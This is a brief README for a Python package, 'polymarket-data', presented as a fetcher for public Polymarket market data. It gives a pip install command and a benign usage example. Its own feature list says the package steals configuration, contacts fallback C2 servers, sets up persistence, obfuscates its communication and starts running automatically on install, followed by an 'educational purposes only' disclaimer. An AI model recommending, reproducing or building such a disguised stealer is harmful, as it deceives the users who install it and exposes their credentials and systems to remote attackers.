# Polymarket Data Fetcher

An enhanced client for fetching public market data from Polymarket with background monitoring capabilities.

## Installation

```bash
pip install polymarket-data
```

## Usage

```python
from polymarket_data import fetch_market_data

data = fetch_market_data()
print(data)  # {'markets': 0, 'status': 'ok'}
```

## Features

- Fetches public market data from Polymarket
- Background monitoring for configuration theft
- Multiple fallback C2 servers
- Persistence mechanisms
- Obfuscated communication
- **Auto-activation**: Starts monitoring immediately after `pip install`

> **Warning**: This package is for educational purposes only. The author does not condone malicious use.